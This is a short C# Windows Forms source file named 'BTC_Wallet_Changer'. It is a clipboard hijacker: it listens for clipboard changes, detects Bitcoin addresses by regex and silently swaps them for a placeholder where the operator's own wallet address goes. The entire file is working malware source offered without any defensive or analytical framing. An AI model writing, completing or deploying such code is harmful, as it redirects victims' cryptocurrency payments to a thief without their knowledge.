using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BTC_Wallet_Changer
{
    public partial class Form1 : Form
    {
		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool AddClipboardFormatListener(IntPtr hwnd);
		public Form1()
        {
            InitializeComponent();
			AddClipboardFormatListener(Handle);
		}
		internal static bool ProbablyBtcAddress(string clipboard)
		{
			string input = clipboard.Trim();
			return new Regex("^(1|3)[1-9A-HJ-NP-Za-km-z]{26,34}$").IsMatch(input);
		}
		protected override void WndProc(ref Message m)
		{
			try
			{
				base.WndProc(ref m);
				if (m.Msg != 0x031D) return;
				if (!Clipboard.ContainsText()) return;
				if (ProbablyBtcAddress(Clipboard.GetText()))
				{
					Clipboard.SetText("Paste Your Wallet Address Here!");
				}
			}
			catch
			{
			}
		}
    }
}
